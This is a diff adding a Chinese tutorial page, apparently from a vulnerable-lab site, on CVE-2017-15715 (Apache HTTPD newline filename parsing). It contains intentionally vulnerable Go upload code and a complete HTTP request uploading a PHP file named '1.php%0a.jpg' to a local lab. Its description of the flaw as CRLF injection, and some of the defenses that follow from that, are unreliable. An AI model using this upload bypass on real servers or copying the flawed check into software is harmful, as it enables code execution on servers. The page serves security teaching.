@@ -1,0 +1,89 @@
+---
+sidebar_position: 4
+---
+
+# CVE-2017-15715：Apache HTTPD 换行解析漏洞
+
+Apache HTTPD 换行解析漏洞是一种 Web 服务器（Apache HTTPD）的安全漏洞，也被称为 CRLF 注入漏洞。该漏洞允许攻击者通过特定的换行符注入恶意内容，进而实施各种攻击。
+
+### 示例代码：
+
+```Go
+fn := header.Filename
+var serverExt string
+var fileSystemExt string
+writeFile, after, _ := strings.Cut(fn, "\x0a")
+fileSystemExt = filepath.Ext(writeFile)
+if after != "" {
+ serverExt = after
+} else {
+serverExt = fileSystemExt
+}
+if !utils.MatchAnyOfSubString(strings.ToLower(serverExt), "jpg", "png", "jpeg", "ico") {
+    unsafeTemplateRender(writer, request, uploadFailed, map[string]any{
+        "reason": fmt.Sprintf(
+            "u upload file: %v, fileSystemExt: %v, serverExt: %v",
+            strconv.Quote(fn), strconv.Quote(fileSystemExt), strconv.Quote(serverExt),
+        ),
+    })
+    return
+tfp, err := consts.TempFile("temp-*-" + writeFile)
+```
+
+### 攻击示例：
+
+按照[RFC2231](http://tools.ietf.org/html/rfc2231)的定义，多语言编码的 Content-Disposition 应该这么定义：
+
+```
+Content-Disposition: form-data; name="filename"; filename*=UTF-8''1.php%0a.jpg
+```
+
+即：
+
+- filename 后面的等号之前要加 \*
+- filename 的值用单引号分成三段，分别是字符集(utf8)、语言(空)和 urlencode 过的文件名。
+- 最好加上双引号，否则文件名中空格后面的部分在 Firefox 中显示不出来
+
+```HTML
+POST /upload/case/cve-2017-15715 HTTP/1.1
+Host: 127.0.0.1:8787
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Content-Length: 233
+Content-Type: multipart/form-data; boundary=---------------------------299942644414050572304234542504
+DNT: 1
+Origin: http://127.0.0.1:8787
+Referer: http://127.0.0.1:8787/upload/main?case=cve-2017-15715
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
+
+-----------------------------299942644414050572304234542504
+Content-Disposition: form-data; name="filename"; filename*=UTF-8''1.php%0a.jpg
+Content-Type: text/php
+
+<?=phpinfo()?>
+-----------------------------299942644414050572304234542504--
+```
+
+### 防御措施：
+
+- 输入验证和过滤：对于所有从用户输入中获取的数据，包括 HTTP 请求头部字段，都应该进行严格的输入验证和过滤。特别是需要对换行符进行过滤，确保不会在用户输入中包含额外的换行符。
+- 规范化输出：在响应中返回的内容应该经过正确的编码和规范化，确保不会将用户输入作为响应头部字段的一部分输出。
+- 升级服务器版本：及时升级 Apache HTTPD 服务器到最新版本，以获得最新的安全修复和漏洞修复。
+- 使用 Web 应用防火墙（WAF）：使用 WAF 可以帮助检测和阻止恶意请求，提高 Web 应用的安全性。
+
+### 靶场演示： 视频
+
+<video
+  src="/img/yaklab/fileupload/03unsafe-cve201715715.mp4"
+  loop={true}
+  playsInline={true}
+  controls={true}
+  autoPlay={true}
+  style={{ width: 890 }}
+/>
